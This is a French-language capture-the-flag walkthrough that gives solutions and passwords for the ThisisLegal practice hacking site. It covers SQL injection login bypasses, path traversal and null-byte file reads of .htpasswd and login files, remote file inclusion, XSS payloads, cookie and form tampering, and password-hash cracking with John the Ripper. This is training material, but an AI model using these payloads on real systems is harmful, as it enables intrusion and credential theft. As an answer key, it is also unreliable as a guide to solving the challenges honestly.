ThisisLegal
===========

http://www.thisislegal.com/

#Challenge 1
afficher la source de la page :
```
      <!-- The password is: easy123 -->
```

#Challenge 2
afficher la source de la page :
```
<script type="text/javascript">
function Login(form) { 
if (form.username.value=="admin") {
if (form.password.value=="imageek") { 
location="f.ID+1";   
} 
else { 
alert("Sorry, wrong username or password provided."); 
}  
}
else { 
alert("Sorry, wrong username or password provided."); 
}  
} 
</script>
```

#Challenge 3
http://www.thisislegal.com/challenge3/index.php?file=http://www.thisislegal.com/challenge3/c_99.txt

#Challenge 4
editer la valeur cookie ALLOWED_ACCESS = NO => YES
rafraichir la page

#Challenge 5
Tamper data, changer la valeur du champ to pour mettre une adresse email valide. 
contenu de l'email : 
```
well done, if you are reading this you manipulated the form. the password is: email403
```

#Challenge 6
http://www.thisislegal.com/robots.txt
```
User-agent: *
Crawl-Delay: 10
Disallow: /robotspage
```
aller sur http://www.thisislegal.com/robotspage

#Challenge 7
fontpage ! => http://www.ouah.org/hfag.txt
aller sur http://www.thisislegal.com/challenge7/_vti_pvt/
récupérer administrators.pwd
```
admin:dut4HlQyu4dSA
```
utiliser john the ripper.
```
# john administrators.pwd 
Created directory: /root/.john
Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
a1b2c3           (admin)
guesses: 1  time: 0:00:00:00 100% (2)  c/s: 15840  trying: 123456 - marley
Use the "--show" option to display all of the cracked passwords reliably
```

#Challenge 8
dans ollydbg à l'adresse 402148 JE => JNZ
==> Correct! pass is crackedapp175

#Challenge 9
http://www.chaos.org.uk/~eddy/craft/substitute.html
ywddzflh = password
==>     well done you have cracked it the password is nowtheleader 

#Challenge 10 
télécharger http://www.thisislegal.com/password.swf
décompilation avec http://www.showmycode.com/
```
if (password == "flashking") { txt3var = "Correct! enter into password box"; } else { txt3var = "Wrong :( Try Again"; }
```

#Programming Challenge 1
dans un scratchpad
```
xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","http://www.thisislegal.com/rand.php",false);
xmlhttp.send();
  
var result = /Welcome, The current security code is: (.*) ... good luck!/g.exec(xmlhttp.responseText);

document.location = "http://www.thisislegal.com/challenge/p1&code=" +result[1];
```

#Realistic Challenge 1
utiliser tamper data, cliquer sur le bouton "buy now".
changer la valeur de "amount".

#Realistic Challenge 2
login : admin' or username='Admin
password : ' or 1=1 --

aller sur Back up Database:
```
-- Table structure for table `users`
-- 

CREATE TABLE `users` (
  `ID` int(2) NOT NULL auto_increment,
  `Username` varchar(255) NOT NULL,
  `Password` varchar(255) NOT NULL,
  `Level_access` varchar(9) NOT NULL,
  PRIMARY KEY  (`ID`),
  UNIQUE KEY `Username` (`Username`),
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

-- 
-- Dumping data for table `users`
-- 

INSERT INTO `users` (`ID`, `Username`, `Password`, `Level_Access`) VALUES 
(1, 'Admin', '3819585098e8cfe6c4fe4fcfd3a0fd59', 'Limited'),
(2, 'SuperAdmin', '8cc4ba204dd44cc92d7646ad035b7647', 'Unlimited')
```
Crack des mots de passe avec http://md5cracker.org :
Admin/xenu5
SuperAdmin/lmon12

se logguer en SuperAdmin, aller sur File Manager

aller dans misc et supprimer targets
aller dans images et supprimer logs


#Realistic Challenge 3
Aller dans l'ajout de lien. utiliser tamper data.
dans le champ T1 : <script>alert('lol');</script>
dans le champ T2 : <script>alert('lol');</script>
dans le champ LinkView : 0

#Realistic Challenge 4
http://www.thisislegal.com/newr/src/read.php?customer=1
affiche le contenu de http://www.thisislegal.com/newr/src/1

http://www.thisislegal.com/newr/src/read.php?customer=toto
```
 Warning: fopen(gbgb) [function.fopen]: failed to open stream: No such file or directory in /home/thisi30/public_html/newr/src/read.php on line 45
```
toto => gbgb

http://www.thisislegal.com/newr/src/read.php?customer=../abcdefghijklmnopqrstuvwxyz
```
 Warning: fopen(../nopqrstuvwxyzabcdefghijklm) [function.fopen]: failed to open stream: No such file or directory in /home/thisi30/public_html/newr/src/read.php on line 45
```
nom du fichier encodé en rot13 !

affichage de la page order2.php : http://www.thisislegal.com/newr/src/read.php?customer=../beqre2.cuc
```
     alert('Request Submitted, thank you');location.href='index.php';"; $File = "secure/orders.db"; $fh = fopen($File, 'a'); $stringData = $_POST['name'] . "\n"; @fwrite($fh, $stringData); $stringData = $_POST['email'] . "\n"; @fwrite($fh, $stringData); $stringData = $_POST['site'] . "\n"; @fwrite($fh, $stringData); @fclose($fh); } ?> 
```

http://www.thisislegal.com/newr/secure/orders.db
authentification http.

affichage du .htaccess : http://www.thisislegal.com/newr/src/read.php?customer=../frpher/.ugnpprff
```
AuthName "Password Protected Area" 
AuthType Basic 
AuthUserFile /home/thisi30/public_html/newr/secure/.htpasswd 
Require valid-user 
```
afficage de .htpasswd : http://www.thisislegal.com/newr/src/read.php?customer=../frpher/.ugcnffjq
```
admin:adzN92vpWgSP6 
```
utilisation de john the ripper
```
sudo john .htpasswd 
Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
vimto            (admin)
guesses: 1  time: 0:00:01:44 (3)  c/s: 1935K  trying: vim2w - vim89
Use the "--show" option to display all of the cracked passwords reliably
```
aller dans http://www.thisislegal.com/newr/secure/

#Realistic Challenge 5
faire une recherche. on arrive sur http://www.thisislegal.com/nc/adm/srch/?s=
aller dans www.thisislegal.com/nc/adm/ => page de login
validation du formulaire ==>  Details supplied do not match information in login.pwd file. 

affichage de l'image d'un serveur : http://www.thisislegal.com/nc/i.php?img=images/server
on l'utilise pour afficher le fichier login.pwd
http://www.thisislegal.com/nc/i.php?img=adm/login.pwd%00

```
admin:aWFta2luZzEyMw==
```
décodage du base64 ==> iamking123
login avec admin/iamking123

#Bonus challenge 1
afficher la source (CTRL+U)
```
<script type="text/javascript">

var pass = "donethebonus";
  var answer = "";

answer = prompt("Enter the password: ", "", "Password");

if (answer == pass)
{
  alert("Password Correct, Well Done :)");
  window.location = pass;
}

else if (answer != pass)
{
  alert("Password Incorrect!");
  alert("Access Denied");
  window.location = "bonusagain";
}

</script>
```

#Bonus challenge 2
le champ password est désactivé.
le réactiver avec l'inpecter
taper 'hello' et valider

#Bonus challenge 3
utiliser tamper data, changer le user agent en "Thisislegal Browser v1"

#Bonus Challenge 4
regarder les différence de la partie <div id="content"> par rapport à un autre challenge.
on trouve :
```
<img border="0" src="../images/spacer.bmp" width="1" height="1" alt="padding" />
```
récupérer l'image, l'ouvrir dan Gimp et adapter le contraste ==> "The password is bitmap38 :)"

#Bonus Challenge 5
télécharger l'image challenge.JPG
rechercher l'entête d'une archive RAR  : 0x 52 61 72 21 1A 07 00
cf. http://www.forensicswiki.org/wiki/RAR
supprimer tout ce qu'il y a avant l'entête avec hexedit ou équivalent

ouvrir l'archive et afficher l'image : "Well done! The password is imgrar :-)"

#Bonus Challenge 6
afficher le contenu de la variable "nls".
==> christian*classical*
user = christian
password = classical

#Bonus Challenge 7
AZPR + attaque par dictionnaire => mot de passe = beefy.
rar password unlocker + attaque par dictionnaire  sur le .rar => clown
ouvrir a.txt => rodent

#Bonus Challenge 8
entrer un mot de passe quelconque.
l'url est redirigée de http://www.thisislegal.com/challenge/b8/ vers http://www.thisislegal.com/l/challenge/b8/
aller dans http://www.thisislegal.com/l/ et afficher form.pwd => gadgit7

#Bonus Challenge 9
416301018221630341
Pairs : 41 63 01 01 82 21 63 03 41
Switch Digit : 14 36 10 10 28 12 36 30 14
Division Same Amount : diviseur commun entre 10 12 et 14 = 2 => 07 18 05 05 14 06 18 15 07
Alphabet : greenfrog

#Bonus Challenge 10
ouvrir les fichiers avec ophcrack.
récupérer les hash NTLM de l'utilisateur Administrator
rainbow table => ATMIY@MRUT

#SQL Challenge 1
login : administrator
password : ' or '1'='1

#SQL Challenge 2
login : admin 
password : ' or '1'='1
==> login en tant que us3r
rafraichir la page => login en tant qu'admin ???
TODO

#Encryption Challenge 1
As a young boy, I was taught in high school that hacking was cool. http://urldecode.org

Back in my day, I would probe by hand. Now you can get commercial software that does the job for you. http://www.nickciske.com/tools/binary.php

Hack the planet (caesar crypt shift=5) http://crypo.in.ua/tools/eng_caesar.php

#User Challenge 1
```
function pw (form)
{

   var d1, d2, d3;

if (navigator.appName == "Netscape"){
   d1= getStyle('content', 'background-color'); 
} else {
   d1= getStyle('content', 'backgroundColor'); 
}

	 d2=form.Name.value;
	 d3=form.Password.value;

  if (d2==d1.length) { 
    if (d3==d1) {
      window.open ("../" + d1.substr(1, 10), "_self")
    } else { 
      alert("Muhaha! Wrong!")
    } 
  } else { 
    alert("Muhaha! Wrong!") 
  } 
}
```
dans un scratchpad :
```
if (navigator.appName == "Netscape"){
   d1= getStyle('content', 'background-color'); 
} else {
   d1= getStyle('content', 'backgroundColor'); 
}

alert(d1); // ==> #000000
alert(d1.length); // ==> 7
```
username = 7
password = #000000

#Application Challenge 1
L'application vérifie qu'elle est appelée de C:\app\thisislegal\app2.exe
==> correct! the password is: nopatch

#Application Challenge 2
utilisation de winable (https://www.raymond.cc/blog/how-to-enable-and-access-disabled-grayed-out-buttons-windows-and-checkboxes/)
==> servent33

#Application Challenge 3
ouvrir avec ollydbg, search for -> all referenced text strings
```
Text string=UNICODE "connecting, please wait..."
Text string=UNICODE "appa3chal/ap/vr.txt"
Text string=UNICODE "/application"
Text string=UNICODE "http://www.thisislegal.com/"
Text string=UNICODE "Correct! Now enter it into the site (unlucky if you patched this)"
Text string=UNICODE "Incorrect, try again"
```
ouvrir http://www.thisislegal.com/appa3chal/ap/vr.txt ==> r3dc0bra

#User Challenge 2
Stegano. on prend chaque lettre en majuscules dans le texte => SAMBA

#User Challenge 3
ouvrir l'image avec gimp.
inverser les couleurs et identifier les drapeaux :
Italie
Hongrie
Bulgarie
Lituanie
Germany
Belgium
roumanie

==> ihblgbr
